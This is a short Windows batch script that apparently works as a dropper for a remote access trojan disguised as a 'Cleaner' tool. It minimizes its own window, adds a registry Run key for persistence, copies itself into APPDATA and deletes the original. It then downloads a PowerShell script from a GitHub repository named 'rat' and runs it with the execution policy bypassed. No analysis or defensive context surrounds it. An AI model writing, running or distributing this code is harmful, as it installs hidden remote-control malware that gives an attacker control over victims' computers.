@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
/v MyApp ^
/t REG_SZ ^
/d "\"C:\%APPDATA%\Cleaner\start.cmd"" ^
/f
copy "%~f0" "%APPDATA%\Cleaner\start.cmd"
del "%~f0"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/cli.ps1' -OutFile 'cli.ps1'"
copy "%~dp0cli.ps1" "%APPDATA%\Cleaner"
powershell -ExecutionPolicy Bypass -File cli.ps1
exit
